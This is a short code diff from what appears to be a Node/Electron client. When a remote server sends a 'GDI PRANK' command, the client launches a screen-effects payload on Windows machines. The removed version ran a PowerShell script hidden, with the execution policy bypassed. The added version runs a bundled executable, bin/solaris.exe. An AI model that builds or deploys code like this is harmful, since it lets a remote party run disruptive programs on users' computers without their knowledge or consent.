@@ -806,15 +806,15 @@ function connectToServer() {
     console.log('[Main] Ricevuto comando GDI PRANK dal server! 💀');
 
     if (process.platform === 'win32') {
-      const scriptPath = path.join(__dirname, '../scripts/gdi-prank.ps1');
-      if (fsSync.existsSync(scriptPath)) {
-        console.log('[Main] Avvio GDI Prank script...');
-        exec(`powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "${scriptPath}"`, (err) => {
-          if (err) console.error('[Main] Errore durante GDI Prank:', err);
-          else console.log('[Main] GDI Prank completato.');
+      const exePath = path.join(__dirname, '../bin/solaris.exe');
+      if (fsSync.existsSync(exePath)) {
+        console.log('[Main] Avvio Solaris C++ Port...');
+        exec(`"${exePath}"`, (err) => {
+          if (err) console.error('[Main] Errore durante Solaris GDI:', err);
+          else console.log('[Main] Solaris GDI completato.');
         });
       } else {
-        console.warn('[Main] Script gdi-prank.ps1 non trovato');
+        console.warn('[Main] Eseguibile bin/solaris.exe non trovato. Assicurati di averlo compilato e inserito nella cartella bin.');
       }
     } else {
       console.log('[Main] GDI Prank non supportato su questa piattaforma');
